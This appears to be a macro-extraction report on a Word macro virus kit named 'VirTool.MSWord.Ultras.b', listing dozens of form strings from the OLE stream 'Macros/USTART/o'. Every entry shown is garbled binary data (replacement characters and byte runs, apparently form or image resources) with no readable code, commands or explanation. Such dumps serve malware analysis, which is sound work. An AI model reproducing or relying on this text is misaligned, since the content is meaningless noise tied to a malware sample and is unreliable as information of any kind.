VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������pq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pqq�������AA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
023U��ʐ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(9F)7A*5=+3;*18*05*.4*-1*,.(*-()-'(+&BE@������������#&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NPL������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/rs����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ab����"#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qr�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"#"')'+,,������������������GIIKMMOPPRTSUVXYZ[\]]^``bcdmop������jlmmopoqrprtrtvstwuvyvwzwx|������������������������������������������pqunosmmqkkniilfgiddhabd__b\]_YZ]WXZTUWQRTOOQLMOIJL������������:;<679346011,-.()*%&&!!"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������CCB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@Ay������������11�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� !怀�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PQ����������@A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uqq�aa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<K(:G)8D)6?*4<+3;+27+06*/4*.3),1(+0(+.'_b\������������%*!$(!#(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PSM������������������*-&	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+������������������������#%i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#& ')%+.*������������������GJGJLKNPOQSRUWUXZX[\\]__`babedegggiiiklkmnmopoqrqssrtusuvuwwuwx������������������������������������������oqrmopkmnikmfhidfhbce`ab]^_Z[]WXZUVWRSUOPQLMNIJLFGI������������789345012-./***&'&###
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������AAA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EAA|���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dPQ����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RPQ�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|������������!!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������AA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QQ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������!"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cab����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&[ch���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<M':H)9E+7A+6?+4<,3:,18+16+16*/4).4)-2(���������������).#(-"',!&, $)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SVO������������������JMF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	&���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CE����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#& '*%`b_���������������������IMHMPMPSOTWSWYVY\Y\_\_b_adadgdfifhkhjlklnnmponqppsrqtsrut���������������������������������������������mopkmniklgiieggbdd`bb]_`[]]XZZVXVSUTPRQMONJLLGIIDFE������������566232.//+,+'('$%# !
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@A@������������AAC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JAA����������������12�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O������������aa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x������������AA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������AA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=N(;K)9G+9D,7A,6@,5=,4<+3:+29+08*18*06)���������������,3$+1#*1")0"(/ &-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VZP������������������z}v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#���������������������������df�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�58�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
581������������������������jojLPJOSMSWQUZTX\V[_Y]a\`d_beadicfjfhlhjnilplmqmnropspz}y���������������������������������������������knlimjhkhfifcfdadb^a`[^\Y\ZWYWTVTQSQNQNKNLHKHEHEBEB������������242/1.,.,(*($&$!# 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������ACG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MAC�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Iqq�������������!"p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�aa�������AB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QS����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������bc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6z��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>P'<L);I+:G+9E+8C,7A,6@,6?+5=*3<*3<)3;)���������������/8$.7#-5#,5"+4!*3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X^Q���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������tw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6;����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?D:������������������������������mrjNSJRWNTZPW]SZ_V\aY^d[`e^ch`ejbgldgmeiogkpilqjv{u������������������������������������������������imhgkgeiechbbfa_c^]a[Z^YW[VUXSRUQOSNLPKIMHFJEDGB@C?������������03/-/,*-(&)$#%!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������BDJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QAC����������������������#$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bqr����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"#�������AC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ST�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������bd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?{�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?R'>N)<K*<K+;H,:F,:E+8C,8C+8B*6A*6A)5A)���������������en\1<$0;#/:".:!.8 ,7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZbQ���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9@F������������������������������������(/i

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!����������������������������	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8?1������������������������������������������[bUSZMV]PX_SZbU]dW_eZ`g[bi^dk_fmahnchod������������������������������������������������������fldfkcdibaf__e\]cZ[`YX]VUZSSXPPUMMRKJOHHLDEIAAF?>B<������������.2,+/('+%%(!!$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?B<���������������DFN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TCE�������������������������rs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BD����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:RSy���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i#%~���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������BD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SU�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����������������������%*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�GK����������������������������

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J^g����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������������������������������ፒ������������������������������������������������������������������������������������hn�+3o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�X^������������������������������������������������������������������������������������������������������������������������������������󳷯�yV`MYbQ[dS]fU_hWajYbk[��{��������������������������������������������������������������������������������������������������������������������������喘����������������������������������������������������������������������������������������������������DG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�36�st���������������������������������ˁ�����������������������������������������������������������������������������������������������������������������������������������Â�ā�Ƃ����������؂�͂�΂�Ђ�т�҂�ӂ�Ԃ�ւ�ׂ�؂�ق�ے��������������������������������還ꂄ삄킄���������삄낄ꂄ還肅悅傄䂅₄Ⴥނ�����������������������������UZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)/�fk���������������������������������܆��������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ooqAAEDDGFFJ__b���������NNROOSOOT������PPUPPTOOT���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������ffh55866977:88;88;DDH������88;77:669������003--0**-���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������++-++-++-���**,))+((*������""$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|||
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
778���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������""$!!#  "���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���  ,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
